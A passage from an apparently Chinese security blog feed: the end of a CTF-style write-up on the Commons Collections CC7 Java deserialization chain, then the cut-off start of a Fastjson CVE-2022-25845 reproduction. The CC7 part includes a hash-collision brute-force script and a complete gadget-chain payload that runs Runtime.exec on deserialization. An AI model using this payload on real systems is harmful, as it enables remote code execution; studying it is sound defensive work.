spellcheck="true">//根据hash值计算存储索引</span>        <span class="token keyword">int</span> index <span class="token operator">=</span> <span class="token punctuation">(</span>hash <span class="token operator">&amp;</span> <span class="token number">0x7FFFFFFF</span><span class="token punctuation">)</span> <span class="token operator">%</span> tab<span class="token punctuation">.</span>length<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//判断元素的key是否重复</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>Entry<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token punctuation">,</span><span class="token operator">?</span><span class="token operator">></span> e <span class="token operator">=</span> tab<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token punctuation">;</span> e <span class="token operator">!=</span> null <span class="token punctuation">;</span> e <span class="token operator">=</span> e<span class="token punctuation">.</span>next<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//如果key重复则抛出异常</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>hash <span class="token operator">==</span> hash<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> e<span class="token punctuation">.</span>key<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>StreamCorruptedException</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">// Creates the new entry.</span>        <span class="token comment" spellcheck="true">//key不重复则将元素添加到table数组中</span>        <span class="token annotation punctuation">@SuppressWarnings</span><span class="token punctuation">(</span><span class="token string">"unchecked"</span><span class="token punctuation">)</span>            Entry<span class="token operator">&lt;</span>K<span class="token punctuation">,</span>V<span class="token operator">></span> e <span class="token operator">=</span> <span class="token punctuation">(</span>Entry<span class="token operator">&lt;</span>K<span class="token punctuation">,</span>V<span class="token operator">></span><span class="token punctuation">)</span>tab<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">;</span>        tab<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Entry</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span>hash<span class="token punctuation">,</span> key<span class="token punctuation">,</span> value<span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">;</span>        count<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p><code>1reconstitutionPut</code>方法首先对<code>value</code>进行不为<code>null</code>的校验，否则抛出反序列化异常，然后根据<code>key</code>计算出元素在<code>table</code>数组中的存储索引，判断元素在<code>table</code>数组中是否重复，如果重复则抛出异常，如果不重复则将元素转换成<code>Entry</code>并添加到<code>table</code>数组中。<br>在判断重复时调用了<code>e.key.equals(key)</code>方法。在编写payload时，我们会令e为<code>LazyMap</code>类，则<code>e.key.equals()</code>调用了<code>LazyMap</code>的<code>equals</code>方法，但是<code>LazyMap</code>中并没有<code>equals</code>方法，实际上是调用了<code>LazyMap</code>的父类<code>AbstractMapDecorator</code>的<code>equals</code>方法，虽然<code>AbstractMapDecorator</code>是一个抽象类，但它实现了<code>equals</code>方法。</p><pre class=" language-java"><code class="language-java">    <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">equals</span><span class="token punctuation">(</span>Object object<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> object <span class="token operator">==</span> <span class="token keyword">this</span> <span class="token operator">?</span> <span class="token boolean">true</span> <span class="token operator">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span>map<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p><code>AbstractMapDecorator</code>类的<code>equals</code>方法只比较了<code>object</code>是否为<code>AbstractMapDecorator</code>的类，如果不是则会再次调用<code>equals</code>方法，<code>map</code>属性是通过<code>LazyMap</code>传递的，我们在构造利用链的时候，通过<code>LazyMap</code>的静态方法<code>decorate</code>将<code>HashMap</code>传给了<code>map</code>属性，因此这里会调用<code>HashMap</code>的<code>equals</code>方法。(这里实际我没绕太明白，断点跟直接跟到<code>AbstractMap</code>里了)<br>在<code>HashMap</code>中并没有找到一个名字为<code>equals</code>的成员方法，但是通过分析发现<code>HashMap</code>继承了<code>AbstractMap</code>抽象类，该类中有一个<code>equals</code>方法。</p><pre class=" language-java"><code class="language-java">   <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">equals</span><span class="token punctuation">(</span>Object o<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//是否为同一对象</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>o <span class="token operator">==</span> <span class="token keyword">this</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//运行类型是否不是Map</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>o <span class="token keyword">instanceof</span> <span class="token class-name">Map</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//向上转型</span>        Map<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token punctuation">,</span><span class="token operator">?</span><span class="token operator">></span> m <span class="token operator">=</span> <span class="token punctuation">(</span>Map<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token punctuation">,</span><span class="token operator">?</span><span class="token operator">></span><span class="token punctuation">)</span> o<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//判断HashMap的元素的个数size</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>m<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>         <span class="token keyword">try</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//获取HashMap的迭代器</span>            Iterator<span class="token operator">&lt;</span>Entry<span class="token operator">&lt;</span>K<span class="token punctuation">,</span>V<span class="token operator">>></span> i <span class="token operator">=</span> <span class="token function">entrySet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">iterator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">while</span> <span class="token punctuation">(</span>i<span class="token punctuation">.</span><span class="token function">hasNext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">//获取每个元素（Node）</span>                Entry<span class="token operator">&lt;</span>K<span class="token punctuation">,</span>V<span class="token operator">></span> e <span class="token operator">=</span> i<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">//获取key和value</span>                K key <span class="token operator">=</span> e<span class="token punctuation">.</span><span class="token function">getKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                V value <span class="token operator">=</span> e<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">//如果value为null，则判断key</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>value <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>m<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token operator">==</span>null <span class="token operator">&amp;&amp;</span> m<span class="token punctuation">.</span><span class="token function">containsKey</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">//如果value不为null，判断value内容是否相同</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>value<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>m<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">ClassCastException</span> unused<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">NullPointerException</span> unused<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>         <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p>抽象类<code>AbstractMap</code>的<code>equals</code>方法进行了更为复杂的判断：</p><pre class=" language-1"><code class="language-1">判断是否为同一对象判断对象的运行类型判断Map中元素的个数</code></pre><p>当以上三个判断都不满足的情况下，则进一步判断<code>Map</code>中的元素，也就是判断元素的<code>key</code>和<code>value</code>的内容是否相同，在<code>value</code>不为<code>null</code>的情况下，<code>m</code>会调用<code>get</code>方法获取<code>key</code>的内容，虽然对象<code>o</code>向上转型成<code>Map</code>类型，但是<code>m</code>对象本质上是一个<code>LazyMap</code>。因此<code>m</code>对象调用<code>get</code>方法时实际上是调用了<code>LazyMap</code>的<code>get</code>方法。</p><h3 id="哈希碰撞"><a href="#哈希碰撞" class="headerlink" title="哈希碰撞"></a>哈希碰撞</h3><p>在<code>reconstitutionPut</code>中有一个check，<code>if</code>这一行由于用<code>&amp;&amp;</code>连接，左边为<code>false</code>就不会执行右边。这两个<code>hash</code>对应当前<code>key</code>和上一个<code>key</code>的<code>hashcode</code>。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>hash <span class="token operator">==</span> hash<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> e<span class="token punctuation">.</span>key<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span></code></pre><p>这里<code>key</code>我们选择的是<code>String</code>，观察<code>String.hashCode()</code></p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> h <span class="token operator">=</span> hash<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>h <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> value<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">char</span> val<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> value<span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> value<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            h <span class="token operator">=</span> <span class="token number">31</span> <span class="token operator">*</span> h <span class="token operator">+</span> val<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        hash <span class="token operator">=</span> h<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> h<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>爆破两位就可。</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> stringletter <span class="token operator">=</span> string<span class="token punctuation">.</span>ascii_uppercase<span class="token operator">+</span>string<span class="token punctuation">.</span>ascii_lowercase<span class="token keyword">def</span> <span class="token function">hashcode</span><span class="token punctuation">(</span>string_expected<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token number">31</span> <span class="token operator">*</span> ord<span class="token punctuation">(</span>string_expected<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> ord<span class="token punctuation">(</span>string_expected<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> letter<span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> letter<span class="token punctuation">:</span>        <span class="token keyword">for</span> k <span class="token keyword">in</span> letter<span class="token punctuation">:</span>            <span class="token keyword">for</span> l <span class="token keyword">in</span> letter<span class="token punctuation">:</span>                str1 <span class="token operator">=</span> i<span class="token operator">+</span>j                str2 <span class="token operator">=</span> k<span class="token operator">+</span>l                <span class="token keyword">if</span> str1 <span class="token operator">!=</span> str2<span class="token punctuation">:</span>                    <span class="token keyword">if</span> hashcode<span class="token punctuation">(</span>str1<span class="token punctuation">)</span> <span class="token operator">==</span> hashcode<span class="token punctuation">(</span>str2<span class="token punctuation">)</span><span class="token punctuation">:</span>                        <span class="token keyword">print</span><span class="token punctuation">(</span>hashcode<span class="token punctuation">(</span>str1<span class="token punctuation">)</span><span class="token punctuation">,</span> str1<span class="token punctuation">,</span> str2<span class="token punctuation">,</span> sep<span class="token operator">=</span><span class="token string">" "</span><span class="token punctuation">)</span></code></pre><p>这也是为什么我们在构造利用链的时候必须添加两个两个元素，因为要通过这个绕过check，虽然这两个元素的<code>hash</code>值是一样的，但本质上是两个不同的元素。</p><h3 id="lazyMap2集合中的第二个元素（yy-yy）"><a href="#lazyMap2集合中的第二个元素（yy-yy）" class="headerlink" title="lazyMap2集合中的第二个元素（yy=yy）"></a>lazyMap2集合中的第二个元素（yy=yy）</h3><p>CC7利用链的<code>payload</code>代码中，<code>Hashtable</code>在添加第二个元素时，<code>lazyMap2</code>集合会“莫名其妙”添加一个元素（yy=yy），<code>Hashtable</code>在调用<code>put</code>方法添加元素的时候会调用<code>equals</code>方法判断是否为同一对象，而在<code>equals</code>中会调用<code>LazyMap</code>的<code>get</code>方法添加一个元素（yy=yy）。</p><p>例如<code>Hashtable</code>调用<code>put</code>方法添加第二个元素（lazyMap2，1）的时候，该方法内部会调用<code>equals</code>方法根据元素的<code>key</code>判断是否为同一元素<br>此时的<code>key</code>是<code>lazyMap2</code>对象，而<code>lazyMap2</code>实际上调用了<code>AbstractMap</code>抽象类的<code>equals</code>方法，<code>equals</code>方法内部会调用<code>lazyMap2</code>的<code>get</code>方法判断<code>table</code>数组中元素的<code>key</code>在<code>lazyMap2</code>是否已存在，如果不存在，<code>transform</code>会把当前传入的<code>key</code>返回作为<code>value</code>，然后<code>lazyMap2</code>会调用<code>put</code>方法把<code>key</code>和<code>value（yy=yy）</code>添加到<code>lazyMap2</code>。</p><p>当在反序列化时，<code>reconstitutionPut</code>方法在还原<code>table</code>数组时会调用<code>equals</code>方法判断重复元素，由于<code>AbstractMap</code>抽象类的<code>equals</code>方法校验的时候更为严格，会判断<code>Map</code>中元素的个数，由于<code>lazyMap2</code>和<code>lazyMap1</code>中的元素个数不一样则直接返回<code>false</code>，那么也就不会触发漏洞。</p><p>因此在构造CC7利用链的<code>payload</code>代码时，<code>Hashtable</code>在添加第二个元素后，<code>lazyMap2</code>需要调用<code>remove</code>方法删除元素（yy=yy）才能触发漏洞。</p><h3 id="payload-2"><a href="#payload-2" class="headerlink" title="payload"></a>payload</h3><pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>Transformer<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span>ChainedTransformer<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span>ConstantTransformer<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span>InvokerTransformer<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>map<span class="token punctuation">.</span>LazyMap<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>*<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>*<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">cc7</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> ClassNotFoundException <span class="token punctuation">{</span>        ChainedTransformer chain<span class="token operator">=</span><span class="token function">getChainedTransformer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Map hashMap1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Map hashMap2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Map map1 <span class="token operator">=</span> LazyMap<span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>hashMap1<span class="token punctuation">,</span> chain<span class="token punctuation">)</span><span class="token punctuation">;</span>        map1<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"00"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Map map2 <span class="token operator">=</span> LazyMap<span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>hashMap2<span class="token punctuation">,</span> chain<span class="token punctuation">)</span><span class="token punctuation">;</span>        map2<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">".n"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Hashtable hashtable <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hashtable</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        hashtable<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>map1<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        hashtable<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>map2<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        map2<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token string">"00"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ObjectOutputStream objectOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"1.ser"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        objectOutputStream<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>hashtable<span class="token punctuation">)</span><span class="token punctuation">;</span>        objectOutputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ObjectInputStream objectInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token string">"1.ser"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        objectInputStream<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">static</span> ChainedTransformer <span class="token function">getChainedTransformer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        ConstantTransformer ct<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span>Runtime<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        InvokerTransformer it1<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span>                <span class="token string">"getMethod"</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> Class<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">}</span>        <span class="token punctuation">)</span><span class="token punctuation">;</span>        InvokerTransformer it2<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span>                <span class="token string">"invoke"</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>Object<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>Object<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">}</span>        <span class="token punctuation">)</span><span class="token punctuation">;</span>        InvokerTransformer it_exec<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span>                <span class="token string">"exec"</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"calc"</span><span class="token punctuation">}</span>        <span class="token punctuation">)</span><span class="token punctuation">;</span>        Transformer<span class="token punctuation">[</span><span class="token punctuation">]</span> a<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>ct<span class="token punctuation">,</span>it1<span class="token punctuation">,</span>it2<span class="token punctuation">,</span>it_exec<span class="token punctuation">}</span><span class="token punctuation">;</span>        ChainedTransformer chain<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> chain<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>参考链接：<br><a href="https://www.cnblogs.com/kingbridge/articles/16141397.html#%E5%93%88%E5%B8%8C%E7%A2%B0%E6%92%9E">https://www.cnblogs.com/kingbridge/articles/16141397.html#%E5%93%88%E5%B8%8C%E7%A2%B0%E6%92%9E</a><br><a href="https://blog.csdn.net/qq_35733751/article/details/119862728">https://blog.csdn.net/qq_35733751/article/details/119862728</a></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2022-25845复现</title>
      <link href="/2023/01/13/CVE-2022-25845%E5%A4%8D%E7%8E%B0/"/>
      <url>/2023/01/13/CVE-2022-25845%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="CVE-2022-25845复现"><a href="#CVE-2022-25845复现" class="headerlink" title="CVE-2022-25845复现"></a>CVE-2022-25845复现</h1><h2 id="Fastjson-“Auto-Type-Bypass”-RCE漏洞"><a href="#Fastjson-“Auto-Type-Bypass”-RCE漏洞" class="headerlink" title="Fastjson “Auto Type Bypass” RCE漏洞"></a>Fastjson “Auto Type Bypass” RCE漏洞</h2><p><code>Fastjson</code>是一个Java库，可以将Java对象序列化和反序列化，实现Java对象和JSON的相互转换。<br>和大多数JSON类一样，<code>Fastjson</code>支持将基本 JSON 类型（数组和对象）分别序列化和反序列化为它们的 Java 等价对象——Arrays 和 Maps。<br>然而，Fastjson也可以将用户的Java对象序列化为JSON，或从JSON反序列化为Java对象。</p><p>我们知道在 fastjson 1.2.25 后设定了 autoType 只有打开 autoType之后才能使用，fastjson 是基于内置黑名单来实现安全的，如此可能会造成安全风险，就是绕过黑名单。<br>不开启时，是基于白名单进行防护的，这个漏洞的产生就是未开启 autoType 时产生的。<br>但是未开启 autoType 时是基于白名单，是很难实现代码执行的，所以我们就需要想办法 Bypass AutoType 默认禁用策略，可以实现调用任意类。</p><h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><p>所有依赖 Fastjson 版本 1.2.80 或更早版本的程序，在应用程序中如果包含使用用户数据调用 JSON.parse 或 JSON.parseObject 方法，但不指定要反序列化的特定类，都会受此漏洞的影响。</p><h3 id="AutoType"><a href="#AutoType" class="headerlink" title="AutoType"></a>AutoType</h3><p>当<code>JSON.parseObject()</code>被调用时，它最终会调用到<code> DefaultJSONParser.parseObject()</code>，并且传入参数<code>object</code>为<code>JSONObject</code>，<code>fieldName</code>为 null。当这个方法遇到<code>@type</code>这个符号（JSON.DEFAULT_TYPE_KEY）时，就会调用<code>config.checkAutoType</code>，其中声明了各种被黑名单列入的类。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">int</span> safeModeMask <span class="token operator">=</span> Feature<span class="token punctuation">.</span>SafeMode<span class="token punctuation">.</span>mask<span class="token punctuation">;</span><span class="token keyword">boolean</span> safeMode <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>safeMode <span class="token operator">||</span> <span class="token punctuation">(</span>features <span class="token operator">&amp;</span> safeModeMask<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span> <span class="token operator">||</span> <span class="token punctuation">(</span>JSON<span class="token punctuation">.</span>DEFAULT_PARSER_FEATURE <span class="token operator">&amp;</span> safeModeMask<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>safeMode<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">JSONException</span><span class="token punctuation">(</span><span class="token string">"safeMode not support autoType : "</span> <span class="token operator">+</span> typeName<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>typeName<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">192</span> <span class="token operator">&amp;&amp;</span> typeName<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">boolean</span> expectClassFlag<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>expectClass <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>        expectClassFlag <span class="token operator">=</span> <span class="token 